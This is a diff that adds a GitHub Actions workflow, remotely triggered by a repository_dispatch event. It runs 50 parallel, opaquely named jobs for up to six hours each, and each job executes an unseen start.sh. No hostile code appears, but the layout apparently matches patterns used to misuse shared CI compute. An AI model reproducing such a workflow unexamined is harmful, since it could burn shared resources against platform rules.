@@ -1,0 +1,23 @@
+name: start
+on:
+  repository_dispatch:
+    types: [starting]
+jobs:
+
+  build:
+    name : FirstStep
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 50
+      fail-fast: false
+      matrix:
+        flag: [Step1, Step2, Step3, Step4, Step5, Step6, Step7, Step8, Step9, Step10, Step11, Step12, Step13, Step14, Step15, Step16, Step17, Step18, Step19, Step20, Step11, Step21, Step31, Step41, Step51, Step61, Step71, Step81, Step91, Step101, Step111, Step121, Step131, Step141, Step151, Step161, Step171, Step181, Step191, Step201, Step12, Step22, Step32, Step42, Step52, Step62, Step72, Step82, Step92, Step102]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 50
+    steps:
+      
+      - uses: actions/checkout@v2
+      
+      - name: Run
+        run: bash start.sh
